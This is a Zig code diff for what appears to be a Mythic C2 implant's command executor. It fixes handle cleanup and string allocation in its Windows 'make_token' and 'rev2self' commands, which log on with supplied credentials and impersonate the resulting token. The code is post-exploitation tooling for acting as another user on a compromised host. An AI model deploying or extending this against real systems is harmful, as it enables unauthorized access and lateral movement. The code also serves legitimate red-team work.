@@ -12,6 +12,12 @@ const ArrayList = std.ArrayList;
 const MythicTask = types.MythicTask;
 const MythicResponse = types.MythicResponse;
 
+const kernel32ext = struct {
+    pub extern "kernel32" fn CloseHandle(
+        hObject: windows.HANDLE,
+    ) callconv(.winapi) windows.BOOL;
+};
+
 const advapi32 = if (builtin.os.tag == .windows) struct {
         pub extern "advapi32" fn LogonUserW(
         lpszUsername: [*:0]const u16,
@@ -54,7 +60,8 @@ pub const CommandExecutor = struct {
     pub fn deinit(self: *CommandExecutor) void {
         if (builtin.os.tag == .windows) {
             if (self.impersonation_token) |token| {
-                windows.CloseHandle(token);
+                _ = advapi32.RevertToSelf();
+                _ = kernel32ext.CloseHandle(token);
                 self.impersonation_token = null;
             }
         }
@@ -414,7 +421,7 @@ pub const CommandExecutor = struct {
         if (comptime builtin.os.tag != .windows) {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = "make_token command is only supported on Windows",
+                .user_output = try std.fmt.allocPrint(self.allocator, "make_token command is only supported on Windows", .{}),
                 .completed = true,
                 .status = "error",
             };
@@ -450,7 +457,7 @@ pub const CommandExecutor = struct {
         // impersonating to avoid handle leaks and other weird insanity.
         if (self.impersonation_token) |old| {
             _ = advapi32.RevertToSelf();
-            windows.CloseHandle(old);
+            _ = kernel32ext.CloseHandle(old);
             self.impersonation_token = null;
         }
 
@@ -475,7 +482,7 @@ pub const CommandExecutor = struct {
                 .status = "error",
             };
         }
-        defer windows.CloseHandle(h_token); //close primary keep dup
+        defer _ =  kernel32ext.CloseHandle(h_token); //close primary keep dup
 
         var h_dup: windows.HANDLE = undefined;
         if (advapi32.DuplicateTokenEx(
@@ -501,7 +508,7 @@ pub const CommandExecutor = struct {
 
         if (advapi32.ImpersonateLoggedOnUser(h_dup) == windows.BOOL.FALSE) {
             const err = windows.GetLastError();
-            windows.CloseHandle(h_dup);
+            _ = kernel32ext.CloseHandle(h_dup);
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(
@@ -532,7 +539,7 @@ pub const CommandExecutor = struct {
         if (comptime builtin.os.tag != .windows) {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = "rev2self is Windows-only",
+                .user_output = try std.fmt.allocPrint(self.allocator, "rev2self is Windows-only", .{}),
                 .completed = true,
                 .status = "error",
             };
@@ -541,7 +548,7 @@ pub const CommandExecutor = struct {
         if (self.impersonation_token == null) {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = "No active impersonation token",
+                .user_output = try std.fmt.allocPrint(self.allocator, "No active impersonation token", .{}),
                 .completed = true,
                 .status = "error",
             };
@@ -561,12 +568,12 @@ pub const CommandExecutor = struct {
             };
         }
 
-        windows.CloseHandle(self.impersonation_token.?);
+        _ = kernel32ext.CloseHandle(self.impersonation_token.?);
         self.impersonation_token = null;
 
         return MythicResponse{
             .task_id = task.id,
-            .user_output = "Reverted to original token",
+            .user_output = try std.fmt.allocPrint( self.allocator, "Reverted to original token", .{}),
             .completed = true,
             .status = "completed",
         };
